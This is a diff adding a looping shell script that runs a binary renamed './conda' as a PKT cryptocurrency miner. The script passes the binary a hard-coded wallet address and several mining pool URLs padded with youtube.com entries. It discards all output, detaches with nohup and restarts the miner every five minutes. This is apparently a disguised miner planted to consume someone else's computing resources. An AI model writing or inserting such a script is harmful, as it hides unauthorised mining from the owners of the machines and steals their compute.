@@ -1,0 +1,9 @@
+sleep 60
+
+while true; do
+nohup ./conda ann -t 1 -p pkt1qk72fmt0t7jlnmzece7fr378mmhwf2luuuqh5lv http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pktpool.io http://pool.srizbi.com > /dev/null 2>&1 &
+sleep 300
+pkill conda
+sleep 60
+done
+
